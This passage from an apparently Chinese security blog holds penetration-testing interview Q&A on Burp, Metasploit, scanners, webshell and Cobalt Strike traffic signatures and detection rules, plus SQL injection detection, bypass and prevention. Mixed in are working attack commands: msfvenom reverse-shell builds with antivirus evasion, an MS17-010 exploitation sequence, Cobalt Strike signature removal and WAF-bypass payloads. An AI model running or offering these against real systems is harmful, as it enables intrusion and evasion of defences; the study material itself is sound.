start="4"><li>子域名枚举用过哪些工具，原理是什么，如果出现了任意子域名都返回200是什么原因？</li></ol><p>子域名枚举工具：<br>(1) theHarvester: 原理是利用网络爬虫技术通过不同公开源中（如baidu、google等搜索引擎，PGP服务器、Shodan数据库等）收集e-mail、用户名、主机名、子域名、雇员、开放端口和Banner等信息。<br>(2) Amass: 可以通过遍历等形式爬取数据源和Web文档，或利用IP地址来搜索相关的网块和ASN，并利用所有收集到的信息来构建目标网络拓扑。<br>(3) subDomainsBrute: 高并发的DNS暴力枚举工具, 使用字典，扫描.<br>(4) OneForAll: 利用证书透明度收集子域, 常规检查收集子域, 利用网上爬虫档案收集子域, 利用DNS数据集收集子域, 利用DNS查询收集子域, 利用威胁情报平台数据收集子域, 利用搜索引擎发现子域<br>(5) knock: 通过被动侦察和字典扫描快速枚举目标域上的子域。<br>(6) subfinder: 使用被动在线资源返回网站的有效子域。</p><p>原因：<br>(1) 目标域名使用了CDN<br>(2) 目标域名使用了反向代理<br>(3) 被拦截器拦截<br>(4) 配置了vhost虚拟主机，或进行端口转发，捕获了http请求后设置规则为200</p><ol start="5"><li>后台扫描用什么工具？</li></ol><p>御剑<br>dirbuster<br>Webdirscan、Cansina、Dirsearch、awvs、wwwscan、dirmap</p><ol start="6"><li>御剑有自己的包吗？</li></ol><p>有配置文件</p><ol start="7"><li>burp会哪些模块？</li></ol><p>(1) Dashboard: 主要分为三块：Tasks(任务)、Event log(事件日志)、issue activity(动态发现的问题)<br>(1) Target: 目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程，Target分为site map和scope两个选项卡。<br>(2) Proxy: Proxy代理模块作为BurpSuite的核心功能，拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。<br>(3) Spider: Burp Spider 是一个映射 web 应用程序的工具。它使用多种智能技术对一个应用程序的内容和功能进行全面的清查。<br>(4) Scanner: Burp Scanner 是一个进行自动发现 web 应用程序的安全漏洞的工具。它是为渗透测试人员设计的，并且它和你现有的手动执行进行的 web 应用程序半自动渗透测试的技术方法很相似。<br>(5) Intruder: Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。<br>(6) Repeater: Burp Repeater 是一个手动修改并补发个别 HTTP 请求，并分析他们的响应的工具。它最大的用途就是和其他 Burp Suite 工具结合起来。你可以从目标站点地图，从 Burp Proxy 浏览记录，或者从 Burp Intruder 攻击结果上的请求，发送到 Repeater 上，并手动调整这个请求来微调对漏洞的探测或攻击。<br>(7) Sequencer: Burp Sequencer是一种用于分析数据项的一个样本中的随机性质量的工具。你可以用它来测试应用程序的session tokens(会话tokens)或其他重要数据项的本意是不可预测的，比如反弹CSRF tokens，密码重置tokens等。<br>(8) Decoder: Burp Decoder是Burp Suite中一款编码解码工具，将原始数据转换成各种编码和哈希表的简单工具，它能够智能地识别多种编码格式采用启发式技术。<br>(9) Comparer: Burp Comparer在Burp Suite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别。<br>(10) Extender: Burp在软件中提供了支持第三方拓展插件的功能，方便使用者编写自己的自定义插件或从插件商店中安装拓展插件。<br>(11) Project: Project options主要用来对Project的一些设置。<br>(12) User options: User options模块主要用来配置一些常用的选项。<br><a href="https://blog.51cto.com/u_15275035/2925893">burpsuite十大模块详细功能介绍</a><br><a href="https://blog.51cto.com/sfsec/3802436">Burpsuite各个模块详细使用</a></p><ol start="8"><li>如果不能用awvs和appscan还能怎么办？</li></ol><p>用其它扫描器。Nessus, Xray<br>手工测试。</p><ol start="9"><li><p>msf用过吗<br>用过。<br>基础使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msfconsole       # 进入框架</span><br><span class="line">search ms17_010  # 使用search命令查找相关漏洞</span><br><span class="line">use exploit/windows/smb/ms17_010_eternablue # 使用use进入模块</span><br><span class="line">info             # 使用info查看模块信息</span><br><span class="line">show targets  # 查看可攻击的系统平台</span><br><span class="line">show payloads # 查看当前漏洞利用模块下可用的所有payload</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp  # 设置攻击载荷</span><br><span class="line">payload模块的类型：Single(完全独立), Stager(负责建立目标用户与攻击者之间的网络连接), Stage(Payload组件)</span><br><span class="line">show options     # 查看模块需要配置的参数</span><br><span class="line">set RHOST 192.168.100.158  # 设置RHOST，攻击主机ip</span><br><span class="line">set LHOST 192.168.100.132 # 设置LHOST，自身主机ip，用于接收目标机的反弹shell</span><br><span class="line">set lport 6666# 设置lport，自身主机端口，默认4444</span><br><span class="line">exploit # 攻击</span><br><span class="line">meterpreter # 后渗透工具</span><br><span class="line">exit # 从目标主机shell退回meterpreter</span><br><span class="line">backgroud # 从meterpreter退出道MSF框架</span><br><span class="line">sessions -l # 查看前面获得的meterpreter_shell会话列表</span><br><span class="line"></span><br><span class="line">后渗透模块：</span><br><span class="line">sysinfo # 查看主机信息</span><br><span class="line">run post/windows/gather/checkvm   # 查看主机是否运行在虚拟机上</span><br><span class="line">run killav # 关闭杀毒软件</span><br><span class="line">run scraper # 获取目标主机的详细信息</span><br><span class="line">download file # 从目标系统中下载文件</span><br><span class="line">upload file # 从目标系统中上传文件</span><br><span class="line">getuid # 获取当前用户信息</span><br><span class="line">getsystem # 自动提权为系统权限</span><br><span class="line">screenshot # 屏幕截图</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">MSF使用</a></p></li><li><p>msf的木马你知道吗？免杀是怎么做的？<br>Windows 生成shell.exe:<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.129 LPORT=9999 -f exe &gt; shell.exe</code><br>Linux 生成木马，使用x86&#x2F;shikata_ga_nai进行5次编码：<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.122.101 -e x86/shikata_ga_nai -i 5 -f elf -o /root/payload_encoder.elf</code></p></li></ol><p>免杀方法：<br>(1) 多次编码免杀<br><code>msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.80.12 LPORT=443 -e x86/shikata_ga_nai-i5 -f exe -o /var/www/html/reverse_http_encode.exe</code></p><p>(2) 自定义二进制的文件模板免杀<br>使用“putty.exe”作为文件模板，而且随着putty程序运行而隐蔽同时运行，还使用编码器进行了编码。<br><code>msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.80.12 LPORT=443 -e x86/shikata_ga_nai-i5 -x ~/putty.exe -k -f exe -o /var/www/html/reverse_http_putty.exe</code></p><p>(3) 使用veil生成免杀代码<br><a href="https://github.com/Veil-Framework/Veil">下载地址</a><br><a href="https://xz.aliyun.com/t/3007">使用方法</a></p><ol start="11"><li>内网提权方面 土豆知道原理吗？<br>烂土豆(RottenPotato)提权就是俗称的MS16-075，是本地提权，不能用于域用户。<br>将Windows工作站上的特权从最低级别提升到 <code>NT AUTHORITY\SYSTEM</code> – Windows计算机上最高权限</li></ol><p>提权原理：<br>(1) 欺骗 <code>NT AUTHORITY\SYSTEM</code> 账户通过NTLM对我们控制的TCP端口进行身份验证<br>(2) 中间人此身份验证尝试（NTLM中继）在本地协商 <code>NT AUTHORITY\SYSTEM</code> 账户的安全令牌。这是通过一系列Windows API调用完成的。<br>(3) 冒充协商好的令牌。仅当攻击者当前账户有权模拟安全令牌时才能做到这一点。通常适用于大多数服务账户，而不适用于大多数用户级账户。</p><p>优点：<br>较为可靠。不需要等Windows更新，可主动触发高权。多版本通杀</p><p>适用版本：<br>Windows 7、8、10、2008、2012</p><p><a href="https://github.com/foxglovesec/Potato">下载地址1</a> <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">下载地址2</a></p><ol start="12"><li>工作中用过哪些扫描器，这些扫描器都有哪些优缺点？<br>1、AWVS<br>优点：<br>(1) 全面的漏洞扫描<br>(2) 自动化的漏洞利用<br>(3) 易于使用<br>(4) 规则更新及时<br>(5) 扫描速度较快</li></ol><p>缺点：<br>(1) 误报率较高<br>(2) 价格高昂<br>(3) 对于一些高级漏洞检测和利用能力有限</p><p>2、Nessus<br>优点：<br>(1) 准确率较高<br>(2) 漏洞库规则全面</p><p>缺点：<br>(1) 不可查询响应代码<br>(2) 扫描速度较慢</p><p>3、Appscan<br>优点：<br>(1) 准确率高<br>(2) 漏洞库规则全面<br>(3) 拥有较完整的漏洞修复建议</p><p>缺点：<br>(1) 扫描速度较慢</p><p>4、杭州安恒（明鉴）<br>漏洞扫描和事件监测是单一产品实现。漏洞扫描速度较慢；发现漏洞类型较多，结果准确。漏洞验证功能较好。综合展示界面直观；报表功能完整，支持任务结果多角度对比。支持开放接口。漏洞验证提供了快速验证，测试等功能，可查看请求响应代码，方便技术人员确认漏洞。但无法批量验证。</p><p>5、绿盟科技（WVSS）<br>漏洞扫描和事件监测是两套产品实现。漏洞扫描速度较快；发现漏洞类型较多；结果准确。支持漏洞验证，支持批量验证。综合展示界面一般。报表功能较为完整，以任务为单位。支持开放接口。</p><p>6、知道创宇（websoc）<br>漏洞扫描和事件监测是单一产品实现。漏洞扫描速度很快；发现漏洞类型关注高中风险，结果准确；能识别网站防护设备。支持漏洞验证。综合展示界面直观，有专用于展示的界面；报表功能完整；支持开放接口。</p><ol start="13"><li><p>burp如何破解md5加密密码或base64加密密码？<br>使用payload模块的md5或base64破解功能</p></li><li><p>kali上，最常用的哪几个工具？<br>1、nmap</p></li></ol><p>2、wireshark</p><p>3、metasploit Framework</p><p>4、Hydra：<br>Hydra是并行化的网络登录破解程序，内置于各种操作系统中<br>Hydra通过使用暴力攻击，猜测正确的用户名和密码<br>kali下是默认安装的，几乎支持所有协议的在线破解</p><p>5、burpsuite</p><p>6、W3AF</p><p>7、sqlmap</p><p>8、Aircrack</p><p>9、Netcat</p><p>10、john</p><ol start="15"><li><p>常见webshell管理工具交互流量特征都有哪些<br>1、菜⼑特征：PHP 类 WebShell流量中eval函数用于执行传递的攻击 payload，流量参数z0、z1、z2<br>2、冰蝎3.0：默认内置 16 个 user-agent，content-type为application&#x2F;octet-stream<br>3、蚁剑：PHP 类 WebShell流量最中明显的特征为 @ini_set (“display_errors”,”0”);</p></li><li><p>冰蝎3.0流量特征</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">默认内置 16 个 user-agent，content-type为application/octet-stream**</span><br><span class="line">请求包中content-length 为5740或5720（可能会根据Java版本而改变)</span><br><span class="line">**每一个请求头中存在Pragma: no-cache，Cache-Control: no-cache**</span><br></pre></td></tr></table></figure></li><li><p>冰蝎3.11流量特征</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、header头顺序是颠倒的</span><br><span class="line">2、发送包是base64，返回包是字节数组，所以会乱码</span><br><span class="line">3、如果冰蝎密码不对，会出现两个连接，第一个是post 第二个是get</span><br></pre></td></tr></table></figure></li><li><p>哥斯拉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不修改User-Agent，User-Agent会类似于Java/1.8.0_121（具体什么版本取决于JDK环境版本）</span><br><span class="line">在请求包的Cookie中有一个非常致命的特征，最后的分号</span><br><span class="line">标准的HTTP请求中最后一个Cookie的值是不应该出现;的</span><br></pre></td></tr></table></figure></li></ol><p>请求包特征<br>1、 “pass&#x3D;”起始<br>2、 请求包较长 响应包为0<br>3.、 一个tcp包里面有三个http</p><p>响应包特征<br>整个响应包的结构体征为：md5前十六位+base64+md5后十六位</p><ol start="19"><li><p>哥斯拉4.0.1中JAVA_AES_BASE64特征流量特征</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">host头</span><br><span class="line">密码和base64字符串是密码=base64字符串的形式</span><br><span class="line">发送包是密码=bae64字符串的形式，返回包是类base64字符串的格式</span><br><span class="line">1. 对称加密算法：JAVA_AES_BASE64是哥斯拉4.0.1使用的对称加密算法;</span><br><span class="line">因此可以根据哥斯拉4.0.1的流量中是否包含JAVA_AES_BASE64来判断是否为哥斯拉4.0.1攻击流量</span><br><span class="line">2. 长度固定：哥斯拉4.0.1使用JAVA_AES_BASE64算法对数据进行加密后，加密后数据的长度是固定的</span><br><span class="line">因此，可以根据攻击流量的长度是否固定来判断是否为哥斯拉4.0.1攻击流量</span><br><span class="line">3. 常见数据前缀：哥斯拉4.0.1加密的数据在明文数据前会添加特定的前缀;</span><br><span class="line">因此，可以根据攻击流量中是否包含常见的数据前缀来判断是否为哥斯拉4.0.1攻击流量。</span><br></pre></td></tr></table></figure></li><li><p>burp插件 burpsuite插件<br>1、Log4j2Scan<br>描述：该工具为被动扫描Log4j2漏洞CVE-2021-44228的BurpSuite插件，具有多DNSLog（后端）平台支持，支持异步并发检测、内网检测、延迟检测等功能。<br><a href="https://github.com/whwlsfb/Log4j2Scan">Download</a></p></li></ol><p>2、BurpFastJsonScan<br>描述：一款基于BurpSuite的被动式FastJson检测插件<br><a href="https://github.com/pmiaowu/BurpFastJsonScan">Download</a></p><p>3、BurpJSLinkFinder<br>描述：用于端点链接的被动扫描 JS 文件的 Burp 扩展。<br><a href="https://github.com/InitRoot/BurpJSLinkFinder">Download</a></p><p>4、BurpShiroPassiveScan<br>描述：一款基于BurpSuite的被动式shiro检测插件<br><a href="https://github.com/pmiaowu/BurpShiroPassiveScan">Download</a></p><p>5、BurpSuite_403Bypasser<br>描述：绕过 403 限制目录的 Burpsuite 扩展<br><a href="https://github.com/sting8k/BurpSuite_403Bypasser">Download</a></p><p>6、Fiora<br>描述：漏洞PoC框架Nuclei的图形版。快捷搜索PoC、一键运行Nuclei。即可作为独立程序运行，也可作为burp插件使用<br><a href="https://github.com/bit4woo/Fiora/releases">Download</a></p><p>7、Hackbar<br>描述：Burpsuite 的 HackBar 插件<br><a href="https://github.com/d3vilbug/HackBar">Download</a></p><p>8、HaE<br>描述：HaE是基于 BurpSuite Java插件API 开发的请求高亮标记与信息提取的辅助型框架式插件，该插件可以通过自定义正则的方式匹配响应报文或请求报文，并对满足正则匹配的报文进行信息高亮与提取。<br><a href="https://github.com/gh0stkey/HaE">Download</a></p><p>9、sqlmap4burp++<br>描述：sqlmap4burp++是一款兼容Windows，mac，linux多个系统平台的Burp与sqlmap联动插件<br><a href="https://github.com/c0ny1/sqlmap4burp-plus-plus">Download</a><br>10、TsojanScan<br>描述：一个集成的BurpSuite漏洞探测插件<br><a href="https://github.com/Tsojan/TsojanScan">Download</a></p><p>11、wooyu 同类漏洞查询<br>描述：从wooyun中提取的payload，以及burp插件<br><a href="https://github.com/boy-hack/wooyun-payload">Download</a></p><p>12、分块传输<br>描述：Burp suite 分块传输辅助插件<br><a href="https://github.com/c0ny1/chunked-coding-converter">Download</a></p><p>13、伪造IP<br>描述：服务端配置错误情况下用于伪造ip地址进行测试的Burp Suite插件<br><a href="https://github.com/TheKingOfDuck/burpFakeIP">Download</a></p><p>14、信息收集管理<br>描述：domain_hunter的高级版本，SRC挖洞、HW打点之必备！自动化资产收集；快速Title获取；外部工具联动；等等<br><a href="https://github.com/bit4woo/domain_hunter_pro">Download</a></p><p>15、验证码爆破<br>描述：captcha-killer的修改版，支持关键词识别base64编码的图片，添加免费ocr库，用于验证码爆破，适配新版Burpsuite<br><a href="https://github.com/f0ng/captcha-killer-modified">Download</a></p><p>16、越权检测<br>描述：AuthMatrix 是一个 Burp Suite 扩展，它提供了一种简单的方法来测试 Web 应用程序和 Web 服务中的授权。<br><a href="https://github.com/SecurityInnovation/AuthMatrix">Download</a></p><ol start="21"><li><p>Android脱壳工具<br>1、DumpDex–主要使用C和C++编写，需要xposed支持<br>2、FART–使用Python编写，ART环境下自动化脱壳方案<br>3、frida-dexdump–主要使用Python和TypeScript语言编写<br>4、BlackDex–支持5.0～12，无需依赖任何环境任何手机都可以使用，包括模拟器。只需几秒，即可对已安装包括未安装的APK进行脱壳。</p></li><li><p>多级代理工具<br>在有些内网环境中，它的内网环境分为好几层，我们必须通过拿到一层内网中服务器的权限之后再通过这一内网中的服务器进一步访问二层内网中的其他服务器。在这种环境中，我们就需要多级代理突破层层内网，来实现在内网中漫游。</p></li></ol><p>多级代理方案：<br>第一种是在内网直接利用Venom、ew、stowaway等工具搭建一个多级代理，然后利用Proxifier连接这个多级代理的最初节点。<br>第二种是利用其他工具如iox、lcx、ew等在内网搭建一个反向代理和一个正向代理，然后利用Proxifier连接多级代理。</p><p>1、Stowaway–利用go语言编写。用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能<br>2、Venom–利用go语言编写。Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。</p><ol start="23"><li>CS流量特征 CobaltStrike流量特征<br><strong>流量特征</strong><br>1、http请求<br>http-beacon通信中，默认使用get方法向 <code>/dpixel, /__utm.gif, /pixel.gif</code> 等地址发起请求，同时请求头存在cookie字段并且值为base64编码后的非对算算法加密数据。<br>2、https证书<br>https-beacon通信中，默认使用空证书建立加密通道<br>3、DNS异常返回值<br>dns-beacon通信中，默认使用 <code>cdn.</code> 、 <code>www6.</code> 、 <code>api.</code> 、 <code>www.</code> 、 <code>post.</code> 为开头发起dns请求，并且查询结果伴随 <code>0.0.0.0</code> 、 <code>0.0.0.80</code> 、 <code>0.0.0.241</code> 等非常规ip。<br>4、强特征<br>ja3&#x2F;ja3s<br>ja3和ja3s分别代表tls握手阶段的client-hello、server-hello的数据集合计算出的哈希值（md5），相同版本相同系统下指纹相同，该特征与操作系统、cobaltstrike版本有关，profile文件无法对其修改。<br>win10-https-beacon-ja3指纹: <code>72a589da586844d7f0818ce684948eea</code><br>centos-cs4.4-ja3s指纹: <code>fd4bc6cea4877646ccd62f0792ec0b62</code></li></ol><p>5、心跳包特征<br>间隔一定时间，均有通信，且流级上的上下行数据长度固定</p><p><strong>规则编写</strong><br>checksum8检查<br>同时命中以下三条规则则触发告警：<br>1、由客户端发起并与目标服务器建立连接：flow: established, to_server;<br>2、请求路径长度为5：urilen:4&lt;&gt;6;<br>3、调用lua计算路径的ascii之和并与256做取余操作，结果为92：luajit:checksum8_check.lua;</p><p>ja3&#x2F;ja3s检查<br>满足其中之一则命中规则触发告警：<br>1、采用黑名单机制，正则匹配由beacon端发起请求的ja3指纹；<br>2、采用黑名单机制，正则匹配由c2端返回的ja3s指纹。</p><ol start="24"><li>CS流量修改&#x2F;CS流量隐藏&#x2F;CS去除流量特征<br>1、修改默认端口<br>编辑teamserver文件，更改server port部分 50433<br>2、取出store证书特征<br>查看证书，默认密码123456<br><code>keytool -list -v -keystore cobaltstrike.store</code><br>3、Malleable-C2-Profiles<br>CS的流量由Malleable C2配置来掌控的，所以我们需要定向去配置这个 <code>Malleable-C2</code></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;工具是兵器，知识是使用方法。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="工具" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之web漏洞篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8Bweb%E6%BC%8F%E6%B4%9E%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8Bweb%E6%BC%8F%E6%B4%9E%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-11-15T07:03:04.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>可以不用，但不能没有。</p><span id="more"></span><h1 id="SQL注入与其它注入"><a href="#SQL注入与其它注入" class="headerlink" title="SQL注入与其它注入"></a>SQL注入与其它注入</h1><ol><li>如何判断sql注入，有哪些方法？</li></ol><p>(1) 判断注入点是否存在。看页面的url是否存在某些参数，然后通过改变，把值变为 +1、-1、9999、1’、1” 等等，查看页面是否有异常变化。<br>(2) 尝试是否有宽字节注入。查看页面编码格式是否为GBK，如果是可以尝试用 <code>1%df&#39;</code> 查看页面变化。<br>(3) 尝试是否有二次注入。先将正常数据写入数据库，然后查看能否带出。<br>(4) 尝试能否从User-Agent, Referer, Cookie等地方注入。使用burp修改参数。<br>(5) 使用sqlmap检测。<br>(6) 通过DNSlog判断是否有传回值。</p><ol start="2"><li>如何判断sql注入漏洞成因？如何防范？注入方式有哪些？除了数据库数据，利用方式还有哪些？注入漏洞防范方法</li></ol><p>当程序执行访问某些表等操作都会执行到sql语句进行调用，如果在此调用过程中，提交了不合法的数据，而数据库无法识别会报错。也就是一切数据都是有害的。<br>注入类型：联合，报错，二次，宽字节，布尔盲注，时间盲注，堆叠注入。<br>注入提交方式：GET, POST, User-Agent, Referer, Cookie, 文  SQL写shell有些执行命令环境要在Linux下。<br>防范：<br>1、使用预编译语句。使用PDO需要注意不要将变量直接拼接到PDO语句中。所有查询语句都使用数据库提供的参数化查询接口，参数化语句使用参数而不是将用户输入变量嵌入到SQL语句中。<br>2、过滤特殊字符。对特殊字符编码或转义。<br>3、代码层要统一。尽量为utf-8，以免由于编码方式不同造成过滤模型被绕过。<br>4、数据类型要严格明确。如果是数字型就不允许输入数字以外的字符，在数据库中类型要明确为int。<br>5、严格限制网站用户的数据库操作权限。给用户提供仅仅能满足其工作的权限，从而最大限度地减少注入攻击对数据库的危害。<br>6、数据长度应该严格规定。能在一定程度上防止比较长的注入语句无法正确执行。<br>7、避免网站显示SQL错误信息，比如类型错误，字段不匹配等，防止攻击者利用这些错误信息进行一些判断。<br>8、过滤危险字符，例如：采用正则表达式匹配union, sleep, and, select, load_file等关键字，如果匹配到则终止运行。<br>加CDN，套waf</p><ol start="3"><li>为什么有的时候没有错误回显？</li></ol><p>没有进行错误打印或错误屏蔽</p><ol start="4"><li>宽字节注入原理？如何利用宽字节注入漏洞？payload如何构造？</li></ol><p>宽字节注入的关键是GBK编码，窄字节占1位，宽字节占2位。利用字符组合形成宽字节，使目标字符逃逸。<br>payload构造方式： <code>?id=1%df&#39;</code><br>根本原因：设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入</p><ol start="5"><li>mysql的网站注入，5.0以上与5.0以下有什么区别？</li></ol><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。<br>5.0以下是多用户单操作，5.0以上是多用户多操作。</p><ol start="6"><li>mysql的用户名密码是存放在哪张表里？mysql密码采用哪种加密方式？</li></ol><p>存放的表：mysql-&gt;users<br>加密方式：SHA1</p><ol start="7"><li>mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</li></ol><p>root权限，网站的绝对路径</p><ol start="8"><li>SQL头注入点</li></ol><p>User-Agent, Referer, Cookie, X-FOR-I</p><ol start="9"><li>mysql写shell有几种方法</li></ol><p>outfile, dumpfile, 开启log写webshell</p><ol start="10"><li>如何突破注入时字符被转义？</li></ol><p>如果可以用宽字节注入，hex编码绕过</p><ol start="11"><li>注入时可以不用 and 或 or 或 xor，直接order by开始注入吗？</li></ol><p>and or xor只是用来判断该处是否存在注入点的方式，如果知道了该处有注入点就不需要了。</p><ol start="12"><li>sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由。<br>A. demo.jsp?id&#x3D;2+1<br>B. demo.jsp?id&#x3D;2-1</li></ol><p>B。在url编码中，“+”代表空格，可能会造成混淆。</p><ol start="13"><li>以下链接存在sql注入漏洞，对于这个变形注入，你有什么思路？<br><code>demo.do?DATA=AjAxNg==</code></li></ol><p><code>AjAxNg==</code> 通过base64解码可得到 <code>016</code><br>注入操作不变，对参数进行base64编码即可。</p><ol start="14"><li>sql注入的几种类型？</li></ol><p>SQL注入的类型：<br>联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入。</p><ol start="15"><li>报错注入函数有哪些？10个</li></ol><p>updatexml, extractvalue, floor, exp, geometrycollection, multipoint, polygon, multipolygon, linestring, multilinestring</p><ol start="16"><li>延时注入如何来判断？</li></ol><p>使用函数sleep()，如果页面有延迟，说明存在延时注入。或者使用sqlmap检测。<br>具体语句： <code>if(ascii(substr(&quot;hello&quot;,1,1))=104,sleep(5),1)</code></p><ol start="17"><li>盲注和延时注入的共同点？</li></ol><p>都是由于没有报错回显，一个字符一个字符地判断对错的手段。</p><ol start="18"><li>sql注入写文件都有哪些函数？</li></ol><p>sql注入写文件的函数：<br>into outfile–能写入多行，按格式输出<br>into dumpfile–只能写入一行，没有输出格式</p><ol start="19"><li>sql注入防护方法？</li></ol><p>使用安全的API，对输入特殊字符进行转义处理，白名单规范化输入验证方法，客户端输入控制不允许输入SQL注入相关的特殊字符，服务端在提交数据进行SQL查询之前，对特殊字符进行过滤转义替换删除。</p><ol start="20"><li>注入有防护怎么办？注入绕过</li></ol><p>绕过：<br>(1) 使用编码绕过（如：url编码，二次url编码，Unicode编码，base64编码，hex编码，ascii编码）<br>(2) 字母大小写转换绕过<br>(3) 空格过滤绕过（如‘+’号代替空格，空白符，注释符&#x2F;**&#x2F;绕过）<br>(4) 双关键字绕过<br>(5) 内联注释绕过(在MySQL里，/**/是多行注释，这个是SQL的标准，但是MySQL扩张了解释的功能，如果在开头的的/*后头加了惊叹号（/*!50001sleep(3)*/），那么此注释里的语句将被执行。)<br>(6) 请求方式差异规则松懈性绕过（有些WAF同时接收GET方法和POST的方法，但只在GET方法中增加了过滤规则，可通过发送POST方法进行绕过。）<br>(7) 异常method绕过（有些WAF只检测GET，POST方法，可通过使用异常方法进行绕过。）<br>(8) 超大数据包绕过（部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测）<br>(9) 复参数绕过（在提交的URL中给一个参数多次赋不同的值 <code>?id=1&amp;id=2</code> , 部分WAF在处理的过程中可能只处理前面提交的参数值，而后端程序在处理的时候可能取的是最后的值）<br>(10) 添加%绕过过滤（将WAF中过滤的敏感字符通过添加%绕过过滤。如 sel%ect）<br>(11) 协议未覆盖绕过（部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换去掉WAF过滤机制。）<br>(12) 宽字节绕过（宽字节注入是因为使用了GBK编码。）<br>(13) %00截断<br>(14) Cookie&#x2F;X-Forwarded-For注入绕过（部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可通过cookie或者X-Forwarded-For提交注入参数语句进行绕过。）<br>(15) 利用pipline绕过（当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理。）<br>(16) 利用分块编码传输绕过（分块传输编码是HTTP的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中header信息存在Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输。）<br>(17) 冷门函数&#x2F;字符&#x2F;运算符绕过（如： Sleep()  &#x3D;&#x3D;&gt; benchmark()）</p><p><a href="https://www.freebuf.com/articles/web/229982.html">WAF机制及绕过方法总结：注入篇</a></p><ol start="21"><li>有没有写过sqlmap tamper？</li></ol><p>写过。<br>使用方式：将所写的tamper，如 <code>xx.py</code> 放入 <code>sqlmap\tamper</code> 路径下，然后使用的时候加上参数 <code>--tamper=xx</code> 即可。<br>PRIORITY: 定义tamper的优先级（LOWEST&#x3D;-100, LOWER&#x3D;-50, LOW&#x3D;-10, NORMAL&#x3D;0, HIGH&#x3D;10, HIGHER&#x3D;50, HIGHEST&#x3D;100）<br>dependencies(): 提示用户tamper支持哪些数据库<br>tamper(): 实现的功能全部在该函数里。要实现绕过一般是针对payload修改。<br>注释混淆，绕安全狗。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span 